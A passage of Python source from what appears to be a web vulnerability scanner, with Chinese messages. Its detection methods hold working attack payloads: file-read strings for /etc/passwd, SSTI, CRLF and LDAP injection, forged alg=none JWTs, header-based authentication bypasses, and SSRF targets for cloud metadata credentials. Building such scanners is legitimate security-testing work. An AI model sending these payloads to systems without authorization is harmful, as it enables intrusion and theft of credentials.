                    logger.debug(f"SSRF 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_xxe(self, url, payloads):
        vulnerabilities = []
        for payload in payloads[:2]:
            try:
                response = self.http_client.post(url, data=payload,
                                                 headers={'Content-Type': 'application/xml'})
                if response and ('root:x:0:0' in response.text or 'www-data' in response.text):
                    vulnerabilities.append({
                        'type': 'XML External Entity (XXE)', 'severity': 'high', 'url': url,
                        'payload': payload, 'evidence': '响应中泄露文件内容',
                        'description': 'XXE 允许读取本地文件',
                        'remediation': '禁用 XML 解析器的外部实体处理',
                    })
            except Exception as e:
                logger.debug(f"XXE 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_path_traversal(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        indicators = ['root:x:0:0', '[fonts]', '[extensions]', 'www-data', 'WINDIR=']
        if not payloads:
            payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '....//....//etc/passwd']

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    for indicator in indicators:
                        if indicator in body:
                            vulnerabilities.append({
                                'type': 'Path Traversal', 'severity': 'high', 'url': url,
                                'parameter': param_name, 'payload': payload,
                                'evidence': f'文件内容指示符命中: {indicator}',
                                'description': '路径遍历允许访问 Web 根目录之外的文件',
                                'remediation': '校验并白名单化文件路径',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            break
                except Exception as e:
                    logger.debug(f"路径遍历测试失败 {url}: {e}")
        return vulnerabilities

    def _check_csrf(self, url, context):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            if '<form' in response.text.lower():
                if not any(t in response.text.lower() for t in ['csrf', 'token', '_token', 'authenticity_token']):
                    vulnerabilities.append({
                        'type': 'Cross-Site Request Forgery (CSRF)', 'severity': 'medium', 'url': url,
                        'evidence': '发现无 CSRF token 的表单',
                        'description': '表单缺少 CSRF 防护',
                        'remediation': '对所有状态变更操作实现 CSRF token',
                    })
        except Exception as e:
            logger.debug(f"CSRF 检测失败 {url}: {e}")
        return vulnerabilities

    def _check_open_redirect(self, url, payloads=None, context=None):
        vulnerabilities = []
        context = context or {}
        redirect_payloads = payloads or ['https://evil.example/', '//evil.example/', '///evil.example/', '/\\evil.example/']
        redirect_keys = ('url', 'redirect', 'next', 'return', 'returnurl', 'redirect_uri', 'goto', 'dest', 'continue')
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        markers = ('evil.example', 'evil.com', '//evil')
        for surface, param_name in targets:
            if not any(rk in param_name.lower() for rk in redirect_keys):
                continue
            for payload in redirect_payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                        response = self.http_client.get(test_url, allow_redirects=False)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload,
                                                        allow_redirects=False)
                    if not response:
                        continue
                    st = getattr(response, 'status_code', 0)
                    location = str(dict(getattr(response, 'headers', {}) or {}).get('Location', ''))
                    body = (getattr(response, 'text', '') or '')[:1500]
                    hit = any(m in location for m in markers) or any(m in body for m in markers)
                    if (st in (301, 302, 303, 307, 308) and hit) or ('window.location' in body.lower() and any(m in body for m in markers)):
                        vulnerabilities.append({
                            'type': 'Open Redirect', 'severity': 'medium', 'url': url,
                            'parameter': param_name, 'payload': payload,
                            'evidence': f'status={st} Location={location[:120]}',
                            'description': '开放重定向可用于钓鱼攻击',
                            'remediation': '对重定向 URL 做白名单校验',
                            'surface': getattr(surface, 'value', 'query'),
                        })
                        break
                except Exception as e:
                    logger.debug(f"开放重定向测试失败 {url}: {e}")
        return vulnerabilities

    def _check_cors(self, url):
        vulnerabilities = []
        try:
            headers = {'Origin': 'http://evil.com'}
            response = self.http_client.get(url, headers=headers)
            if response:
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                if acao == 'http://evil.com' or acao == '*':
                    vulnerabilities.append({
                        'type': 'CORS Misconfiguration', 'severity': 'medium', 'url': url,
                        'evidence': f'Access-Control-Allow-Origin: {acao}',
                        'description': '过度宽松的 CORS 策略',
                        'remediation': '将 CORS 限制为受信任来源',
                    })
        except Exception as e:
            logger.debug(f"CORS 检测失败 {url}: {e}")
        return vulnerabilities

    def _check_security_headers(self, url, context=None):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            headers = response.headers
            security_headers = {
                'X-Frame-Options': '缺少点击劫持防护',
                'X-Content-Type-Options': '缺少 MIME 嗅探防护',
                'Strict-Transport-Security': '未启用 HSTS',
                'Content-Security-Policy': '未实现 CSP',
                'X-XSS-Protection': '缺少 XSS 防护头',
            }
            for header, description in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        'type': 'Security Misconfiguration', 'severity': 'low', 'url': url,
                        'evidence': f'缺少响应头: {header}',
                        'description': description,
                        'remediation': f'为所有响应添加 {header} 头',
                    })
        except Exception as e:
            logger.debug(f"安全头检测失败 {url}: {e}")
        return vulnerabilities

    def _check_lfi(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        lfi_indicators = ['root:x:0:0', '[boot loader]', 'www-data', '[extensions]', 'for 16-bit app support', 'WINDIR=']
        if not payloads:
            payloads = [
                '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd', '..%2F..%2F..%2Fetc%2Fpasswd',
                'php://filter/convert.base64-encode/resource=index.php', '/etc/passwd',
            ]

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    for indicator in lfi_indicators:
                        if indicator in body:
                            vulnerabilities.append({
                                'type': 'Local File Inclusion (LFI)', 'severity': 'high', 'url': url,
                                'parameter': param_name, 'payload': payload,
                                'evidence': f'文件内容指示符命中: {indicator}',
                                'description': 'LFI 允许读取服务器本地文件',
                                'remediation': '校验并白名单化文件路径，避免直接文件访问',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            break
                except Exception as e:
                    logger.debug(f"LFI 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_rfi(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        if not payloads:
            payloads = [
                'http://127.0.0.1/rfi-probe-deepeye.txt',
                'https://127.0.0.1/rfi-probe-deepeye.php',
                'php://filter/convert.base64-encode/resource=http://127.0.0.1/x',
            ]
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        markers = ('rfi-probe-deepeye', 'deepeye_rfi', 'failed to open stream', 'include(', 'require(', 'allow_url_include')
        for surface, param_name in targets:
            for payload in payloads[:3]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = (getattr(response, 'text', '') or '')
                    if any(m in body.lower() for m in markers):
                        vulnerabilities.append({
                            'type': 'Remote File Inclusion (RFI)', 'severity': 'critical', 'url': url,
                            'parameter': param_name, 'payload': payload,
                            'evidence': '响应中出现远程文件内容或 include 错误',
                            'description': 'RFI 允许包含远程文件，可能导致 RCE',
                            'remediation': '禁用 allow_url_include，校验并白名单化文件路径',
                            'surface': getattr(surface, 'value', 'query'),
                        })
                        break
                except Exception as e:
                    logger.debug(f"RFI 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_ssti(self, url, payloads, context=None):
        vulnerabilities = []
        context = context or {}
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        if not payloads:
            payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '{{config}}', "{{7*'7'}}", '#{7*7}', '*{7*7}']

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, urlencode(test_params, doseq=True), parsed.fragment))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    evaluated = (('49' in body and '7*7' in payload)
                                 or ('7777777' in body and "7*'7'" in payload.replace('"', "'")))
                    if evaluated or ('config' in payload.lower() and 'config' in body.lower() and payload not in body):
                        vulnerabilities.append({
                            'type': 'Server-Side Template Injection (SSTI)', 'severity': 'critical',
                            'url': url, 'parameter': param_name, 'payload': payload,
                            'evidence': '响应中模板表达式被求值',
                            'description': 'SSTI 允许服务器端任意代码执行',
                            'remediation': '使用沙箱模板，校验用户输入，避免用户可控模板内容',
                            'surface': getattr(surface, 'value', 'query'),
                        })
                        break
                except Exception as e:
                    logger.debug(f"SSTI 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_crlf_injection(self, url, payloads=None, context=None):
        vulnerabilities = []
        context = context or {}
        payloads = payloads or [
            '%0d%0aSet-Cookie:test=crlf', '%0d%0aLocation:http://evil.example',
            '%0ASet-Cookie:test=crlf', '%0D%0ASet-Cookie:test=crlf',
            '\r\nSet-Cookie:test=crlf', '%E5%98%8A%E5%98%8DSet-Cookie:test=crlf',
        ]
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    hdrs = str(getattr(response, 'headers', {}) or {}).lower()
                    if 'test=crlf' in hdrs or ('set-cookie' in hdrs and 'crlf' in hdrs):
                        vulnerabilities.append({
                            'type': 'CRLF Injection', 'severity': 'medium', 'url': url,
                            'parameter': param_name, 'payload': payload,
                            'evidence': '响应中发现注入的响应头',
                            'description': 'CRLF 注入允许响应头操纵与响应拆分',
                            'remediation': '校验并净化用户输入，去除换行字符',
                            'surface': getattr(surface, 'value', 'query'),
                        })
                        break
                except Exception as e:
                    logger.debug(f"CRLF 测试失败 {url}: {e}")
        return vulnerabilities

    def _check_host_header_injection(self, url):
        vulnerabilities = []
        evil_hosts = ['evil.com', 'attacker.com', 'test.evil.com']
        for evil_host in evil_hosts:
            try:
                response = self.http_client.get(url, headers={'Host': evil_host})
                if response and evil_host in response.text:
                    vulnerabilities.append({
                        'type': 'Host Header Injection', 'severity': 'medium', 'url': url,
                        'payload': evil_host,
                        'evidence': f'注入 Host "{evil_host}" 反射回响应',
                        'description': 'Host 头注入可导致缓存投毒、密码重置投毒与 SSRF',
                        'remediation': '对 Host 头做白名单校验，使用绝对 URL',
                    })
                    break
            except Exception as e:
                logger.debug(f"Host 头注入测试失败 {url}: {e}")
        return vulnerabilities

    def _check_ldap_injection(self, url, payloads=None, context=None):
        vulnerabilities = []
        context = context or {}
        if not payloads:
            payloads = ['*', '*)(&', '*)(uid=*', 'admin)(&(password=*', '*)(objectClass=*', '*))(|(cn=*']
        ldap_errors = [
            'javax.naming.NameNotFoundException', 'LDAPException', 'com.sun.jndi.ldap',
            'Search: Bad search filter', 'Protocol error occurred', 'Size limit exceeded',
            'invalid dn', 'bad search filter',
        ]
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)

        for surface, param_name in targets:
            for payload in payloads[:5]:
                try:
                    if surface is None:
                        parsed = urlparse(url)
                        params = parse_qs(parsed.query)
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                        response = self.http_client.get(test_url)
                    else:
                        response = self._inject_and_get(url, context, surface, param_name, payload)
                    if not response:
                        continue
                    body = getattr(response, 'text', '') or ''
                    for error in ldap_errors:
                        if error.lower() in body.lower():
                            vulnerabilities.append({
                                'type': 'LDAP Injection', 'severity': 'high', 'url': url,
                                'parameter': param_name, 'payload': payload,
                                'evidence': f'LDAP 错误命中: {error}',
                                'description': 'LDAP 注入允许操纵 LDAP 查询',
                                'remediation': '使用参数化 LDAP 查询，校验并净化输入',
                                'surface': getattr(surface, 'value', 'query'),
                            })
                            break
                except Exception as e:
                    logger.debug(f"LDAP 注入测试失败 {url}: {e}")
        return vulnerabilities

    def _check_xml_injection(self, url, payloads):
        vulnerabilities = []
        if not payloads:
            payloads = ['<foo>test</foo>', '<?xml version="1.0"?><foo>test</foo>', '<test><foo>bar</foo></test>', '</foo><injected>test</injected><foo>']
        for payload in payloads[:3]:
            try:
                response = self.http_client.post(url, data=payload, headers={'Content-Type': 'application/xml'})
                if response and ('injected' in response.text or 'test' in response.text):
                    vulnerabilities.append({
                        'type': 'XML Injection', 'severity': 'medium', 'url': url,
                        'payload': payload, 'evidence': '注入的 XML 内容反射回响应',
                        'description': 'XML 注入允许操纵 XML 结构',
                        'remediation': '校验并净化 XML 输入，使用 XML schema 校验',
                    })
                    break
            except Exception as e:
                logger.debug(f"XML 注入测试失败 {url}: {e}")
        return vulnerabilities

    def _check_insecure_deserialization(self, url, context=None):
        vulnerabilities = []
        serialization_patterns = [
            r'rO0[A-Za-z0-9+/=]+',  # Java 序列化 (Base64)
            r'__reduce__',           # Python pickle
            r'O:\d+:',               # PHP 序列化
        ]
        try:
            response = self._baseline(url, context)
            if response:
                cookies_str = str(response.cookies)
                response_text = response.text
                for pattern in serialization_patterns:
                    if re.search(pattern, cookies_str) or re.search(pattern, response_text):
                        vulnerabilities.append({
                            'type': 'Insecure Deserialization', 'severity': 'critical', 'url': url,
                            'evidence': f'序列化模式命中: {pattern}',
                            'description': '不安全的反序列化可导致远程代码执行',
                            'remediation': '避免反序列化不可信数据，使用 JSON 等安全格式',
                        })
                        break
        except Exception as e:
            logger.debug(f"反序列化检测失败 {url}: {e}")
        return vulnerabilities

    def _check_authentication_bypass(self, url, context):
        vulnerabilities = []
        bypass_techniques = [
            ({'X-Original-URL': '/admin'}, 'X-Original-URL 头绕过'),
            ({'X-Rewrite-URL': '/admin'}, 'X-Rewrite-URL 头绕过'),
            ({'X-Forwarded-For': '127.0.0.1'}, 'IP 白名单绕过'),
            ({'X-Custom-IP-Authorization': '127.0.0.1'}, '自定义 IP 头绕过'),
        ]
        baseline_response = self._baseline(url, context)
        if not baseline_response:
            return vulnerabilities
        for headers, technique in bypass_techniques:
            try:
                response = self.http_client.get(url, headers=headers)
                if response:
                    if response.status_code != baseline_response.status_code:
                        if response.status_code == 200 and baseline_response.status_code in [401, 403]:
                            vulnerabilities.append({
                                'type': 'Authentication Bypass', 'severity': 'critical', 'url': url,
                                'evidence': f'使用 {technique} 成功绕过',
                                'description': '可通过头部操纵绕过认证',
                                'remediation': '实现正确的认证检查，校验所有请求头',
                            })
            except Exception as e:
                logger.debug(f"认证绕过测试失败 {url}: {e}")
        return vulnerabilities

    def _check_information_disclosure(self, url, context):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            disclosure_patterns = {
                r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\\s]+)': '响应中泄露密码',
                r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([^"\'\\s]+)': '响应中泄露 API key',
                r'(?i)(secret|token)\s*[:=]\s*["\']?([^"\'\\s]+)': '响应中泄露密钥/token',
                r'mysql_connect\(': '数据库凭据泄露',
                r'(?i)connection\s+string': '连接字符串泄露',
                r'(?i)private\s+key': '私钥泄露',
                r'-----BEGIN (RSA|DSA|EC) PRIVATE KEY-----': '响应中泄露私钥',
                r'(?i)exception|error|stack\s+trace': '堆栈跟踪/错误详情泄露',
            }
            for pattern, description in disclosure_patterns.items():
                if re.search(pattern, response.text):
                    vulnerabilities.append({
                        'type': 'Information Disclosure', 'severity': 'high', 'url': url,
                        'evidence': description,
                        'description': '响应中暴露敏感信息',
                        'remediation': '从响应中移除敏感数据，实现正确的错误处理',
                    })
        except Exception as e:
            logger.debug(f"信息泄露检测失败 {url}: {e}")
        return vulnerabilities

    def _check_sensitive_data_exposure(self, url, context):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            sensitive_patterns = {
                r'\b\d{3}-\d{2}-\d{4}\b': 'SSN 模式命中',
                r'\b\d{16}\b': '信用卡号模式命中',
                r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b': '暴露邮箱地址',
                r'\b\d{3}[- ]?\d{3}[- ]?\d{4}\b': '暴露电话号码',
            }
            if not url.startswith('https://'):
                vulnerabilities.append({
                    'type': 'Sensitive Data Exposure', 'severity': 'medium', 'url': url,
                    'evidence': '数据经未加密连接传输',
                    'description': '敏感数据未加密传输',
                    'remediation': '对所有敏感数据传输使用 HTTPS',
                })
            for pattern, description in sensitive_patterns.items():
                matches = re.findall(pattern, response.text)
                if matches:
                    vulnerabilities.append({
                        'type': 'Sensitive Data Exposure', 'severity': 'high', 'url': url,
                        'evidence': f'{description} - 发现 {len(matches)} 处',
                        'description': '响应中暴露敏感数据',
                        'remediation': '脱敏或移除敏感数据，实现正确的数据保护',
                    })
        except Exception as e:
            logger.debug(f"敏感数据检测失败 {url}: {e}")
        return vulnerabilities

    def _check_jwt_vulnerabilities(self, url, context):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            auth_header = response.headers.get('Authorization', '')
            cookies_str = str(response.cookies)
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            jwt_tokens = re.findall(jwt_pattern, auth_header + ' ' + cookies_str + ' ' + response.text)
            for token in jwt_tokens[:2]:
                parts = token.split('.')
                if len(parts) == 3:
                    try:
                        header_padded = parts[0] + '=' * (4 - len(parts[0]) % 4)
                        header = json.loads(base64.urlsafe_b64decode(header_padded))
                        if header.get('alg', '').lower() == 'none':
                            vulnerabilities.append({
                                'type': 'JWT Vulnerability', 'severity': 'critical', 'url': url,
                                'evidence': 'JWT 使用 "none" 算法',
                                'description': '使用 "none" 算法的 JWT 允许签名绕过',
                                'remediation': '拒绝 "none" 算法，使用强签名算法',
                            })
                        if header.get('alg', '').lower() in ['hs256', 'hs384', 'hs512']:
                            vulnerabilities.append({
                                'type': 'JWT Vulnerability', 'severity': 'medium', 'url': url,
                                'evidence': f'JWT 使用对称算法: {header.get("alg")}',
                                'description': 'JWT 使用 HMAC，可能受密钥混淆攻击影响',
                                'remediation': '使用非对称算法（RS256/ES256）',
                            })
                    except Exception as e:
                        logger.debug(f"JWT 解码失败: {e}")
        except Exception as e:
            logger.debug(f"JWT 检测失败 {url}: {e}")
        return vulnerabilities

    def _check_broken_authentication(self, url, context):
        vulnerabilities = []
        try:
            response = self._baseline(url, context)
            if not response:
                return vulnerabilities
            cookies = response.cookies
            for cookie in cookies:
                if 'session' in cookie.name.lower() or 'token' in cookie.name.lower():
                    if not cookie.secure:
                        vulnerabilities.append({
                            'type': 'Broken Authentication', 'severity': 'high', 'url': url,
                            'evidence': f'会话 cookie "{cookie.name}" 缺少 Secure 标志',
                            'description': '无 Secure 标志的会话 cookie 可被拦截',
                            'remediation': '为所有会话 cookie 设置 Secure 标志',
                        })
                    if not cookie.has_nonstandard_attr('HttpOnly'):
                        vulnerabilities.append({
                            'type': 'Broken Authentication', 'severity': 'medium', 'url': url,
                            'evidence': f'会话 cookie "{cookie.name}" 缺少 HttpOnly 标志',
                            'description': '无 HttpOnly 标志的会话 cookie 易受 XSS 攻击',
                            'remediation': '为所有会话 cookie 设置 HttpOnly 标志',
                        })
            for cookie in cookies:
                if 'session' in cookie.name.lower():
                    if cookie.value.isdigit() or len(cookie.value) < 16:
                        vulnerabilities.append({
                            'type': 'Broken Authentication', 'severity': 'critical', 'url': url,
                            'evidence': f'检测到弱会话 ID: {cookie.name}',
                            'description': '可预测或过弱的会话 ID 可被猜测',
                            'remediation': '使用强随机会话 ID 生成',
                        })
        except Exception as e:
            logger.debug(f"失效认证检测失败 {url}: {e}")
        return vulnerabilities

    # ============================================================
    # 深检测（移植自 deep-eye modules/ 自包含 feature testers）
    # ============================================================
    _JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @classmethod
    def _make_token(cls, header: Dict, payload: Dict, sig: bytes = b"") -> str:
        h = cls._b64url(json.dumps(header, separators=(",", ":")).encode())
        p = cls._b64url(json.dumps(payload, separators=(",", ":")).encode())
        s = cls._b64url(sig) if sig else ""
        return f"{h}.{p}.{s}"

    def _check_jwt_deep(self, url, context=None):
        vulnerabilities = []
        tokens = self._extract_jwt_tokens(url, context)
        for token in tokens:
            vulnerabilities.extend(self._jwt_alg_none(url, token))
            vulnerabilities.extend(self._jwt_kid_traversal(url, token))
        return vulnerabilities

    def _extract_jwt_tokens(self, url, context):
        found = set()
        ctx = context or {}
        resp = ctx.get("response")
        blobs = [url]
        if resp is not None:
            blobs.append(getattr(resp, "text", "") or "")
            blobs.append(str(dict(getattr(resp, "headers", {}) or {})))
            try:
                blobs.append(str(dict(getattr(resp, "cookies", {}) or {})))
            except Exception:
                pass
        for b in blobs:
            for m in self._JWT_RE.findall(str(b)):
                found.add(m)
        return list(found)[:5]

    def _jwt_alg_none(self, url, token):
        out = []
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return out
            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_raw))
            none_tok = self._make_token({"alg": "none", "typ": "JWT"}, payload, b"")
            for header_name in ("Authorization", "X-Auth-Token", "Cookie"):
                headers = {}
                if header_name == "Authorization":
                    headers[header_name] = f"Bearer {none_tok}"
                elif header_name == "Cookie":
                    headers[header_name] = f"token={none_tok}"
                else:
                    headers[header_name] = none_tok
                resp = self.http_client.get(url, headers=headers)
                if resp and getattr(resp, "status_code", 0) in (200, 201):
                    body = (getattr(resp, "text", "") or "")[:500]
                    if "invalid" not in body.lower() and "unauthorized" not in body.lower():
                        out.append({
                            "type": "JWT Algorithm None Accepted", "severity": "critical", "url": url,
                            "parameter": header_name, "payload": none_tok[:80] + "...",
                            "evidence": f"HTTP {resp.status_code} 使用 alg=none token",
                            "description": "服务器可能接受无签名 JWT（alg=none）",
                            "remediation": "显式拒绝 alg=none，强制算法白名单",
                        })
                        break
        except Exception as e:
            logger.debug(f"JWT alg none 测试: {e}")
        return out

    def _jwt_kid_traversal(self, url, token):
        out = []
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return out
            hdr_raw = parts[0] + "=" * (-len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(hdr_raw))
            evil = dict(header)
            evil["kid"] = "../../../../etc/passwd"
            payload_raw = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_raw))
            tok = self._make_token(evil, payload, b"x")
            resp = self.http_client.get(url, headers={"Authorization": f"Bearer {tok}"})
            if resp and "root:" in (getattr(resp, "text", "") or ""):
                out.append({
                    "type": "JWT kid Path Traversal", "severity": "high", "url": url,
                    "parameter": "kid", "payload": evil["kid"],
                    "evidence": "响应含 passwd 类内容",
                    "description": "JWT kid 被不安全地用于密钥查找",
                    "remediation": "不要将 kid 映射到文件路径，从密钥库取 key ID",
                })
        except Exception as e:
            logger.debug(f"JWT kid 测试: {e}")
        return out

    def _check_cors_csp(self, url, context=None):
        vulnerabilities = []
        vulnerabilities.extend(self._cors_deep(url))
        vulnerabilities.extend(self._cors_preflight(url))
        vulnerabilities.extend(self._csp_deep(url, context))
        return vulnerabilities

    def _cors_deep(self, url):
        out = []
        host = urlparse(url).hostname or "target.local"
        origins = [
            "https://evil.example", "null",
            f"https://{host}.evil.example", f"https://evil.{host}",
            "https://evil.example%60." + host,
        ]
        for origin in origins:
            try:
                resp = self.http_client.get(url, headers={"Origin": origin})
                if not resp:
                    continue
                h = {k.lower(): v for k, v in dict(resp.headers).items()}
                acao = h.get("access-control-allow-origin", "")
                acac = h.get("access-control-allow-credentials", "")
                if acao == "*":
                    sev = "high" if str(acac).lower() == "true" else "medium"
                    out.append({
                        "type": "CORS Wildcard ACAO", "severity": sev, "url": url,
                        "parameter": "Origin", "payload": origin,
                        "evidence": f"ACAO={acao} ACAC={acac}",
                        "description": "Access-Control-Allow-Origin 为 *（配合凭据更危险）",
                        "remediation": "返回显式受信任来源，切勿配合凭据使用 *",
                    })
                elif acao == origin or acao == "null":
                    sev = "high" if str(acac).lower() == "true" else "medium"
                    out.append({
                        "type": "CORS Origin Reflection", "severity": sev, "url": url,
                        "parameter": "Origin", "payload": origin,
                        "evidence": f"ACAO={acao} ACAC={acac}",
                        "description": "服务器在 ACAO 中反射任意 Origin",
                        "remediation": "服务端白名单化允许的来源",
                    })
                    if str(acac).lower() == "true":
                        break
            except Exception as e:
                logger.debug(f"CORS 深检测失败: {e}")
        return out

    def _cors_preflight(self, url):
        try:
            origin = "https://evil.example"
            resp = self.http_client.request(
                "OPTIONS", url,
                headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "PUT",
                    "Access-Control-Request-Headers": "X-Custom-Auth, Authorization",
                },
            )
            if not resp:
                return []
            h = {k.lower(): str(v) for k, v in dict(getattr(resp, "headers", {}) or {}).items()}
            acao = h.get("access-control-allow-origin", "")
            acam = h.get("access-control-allow-methods", "")
            acah = h.get("access-control-allow-headers", "")
            if acao in (origin, "*") and ("PUT" in acam.upper() or "*" in acam or "authorization" in acah.lower()):
                return [{
                    "type": "CORS Preflight Permissive", "severity": "medium", "url": url,
                    "parameter": "OPTIONS", "payload": origin,
                    "evidence": f"ACAO={acao} ACAM={acam} ACAH={acah}",
                    "description": "预检允许不受信任来源使用敏感方法/请求头",
                    "remediation": "将 ACAO/ACAM/ACAH 限制为所需值",
                }]
        except Exception as e:
            logger.debug(f"CORS 预检: {e}")
        return []

    def _csp_deep(self, url, context):
        out = []
        headers = {}
        resp = (context or {}).get("response")
        if resp is not None:
            headers = {k.lower(): v for k, v in dict(getattr(resp, "headers", {}) or {}).items()}
        else:
            r = self.http_client.get(url)
            if r:
                headers = {k.lower(): v for k, v in dict(r.headers).items()}
        csp = headers.get("content-security-policy") or headers.get("content-security-policy-report-only")
        if not csp:
            out.append({
                "type": "Missing Content-Security-Policy", "severity": "low", "url": url,
                "parameter": "", "payload": "", "evidence": "无 CSP 头",
                "description": "缺少 CSP 会放大 XSS 影响",
                "remediation": "部署严格的 Content-Security-Policy",
            })
            return out
        csp_l = str(csp).lower()
        if "unsafe-inline" in csp_l:
            out.append({
                "type": "CSP unsafe-inline", "severity": "medium", "url": url,
                "parameter": "Content-Security-Policy", "payload": "", "evidence": str(csp)[:300],
                "description": "CSP 允许 unsafe-inline 脚本/样式",
                "remediation": "移除 unsafe-inline，使用 nonce 或 hash",
            })
        if "unsafe-eval" in csp_l:
            out.append({
                "type": "CSP unsafe-eval", "severity": "medium", "url": url,
                "parameter": "Content-Security-Policy", "payload": "", "evidence": str(csp)[:300],
                "description": "CSP 允许 unsafe-eval",
                "remediation": "从 script-src 移除 unsafe-eval",
            })
        if "script-src *" in csp_l or "script-src*" in csp_l or "default-src *" in csp_l:
            out.append({
                "type": "CSP Wildcard script-src", "severity": "medium", "url": url,
                "parameter": "Content-Security-Policy", "payload": "", "evidence": str(csp)[:300],
                "description": "CSP 允许通配符脚本来源",
                "remediation": "将 script-src 固定到受信任主机，避免 *",
            })
        if "data:" in csp_l and "script-src" in csp_l:
            out.append({
                "type": "CSP data: in script-src", "severity": "medium", "url": url,
                "parameter": "Content-Security-Policy", "payload": "", "evidence": str(csp)[:300],
                "description": "script-src 中的 data: URI 启用 XSS gadget",
                "remediation": "从 script-src 移除 data:",
            })
        if "trusted-types" not in csp_l and "require-trusted-types-for" not in csp_l:
            out.append({
                "type": "CSP Missing Trusted Types", "severity": "info", "url": url,
                "parameter": "Content-Security-Policy", "payload": "", "evidence": "无 Trusted-Types 指令",
                "description": "未启用 Trusted Types（DOM XSS 缓解）",
                "remediation": "在支持的场景添加 require-trusted-types-for 'script'",
            })
        return out

    _SSRF_BYPASS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/",
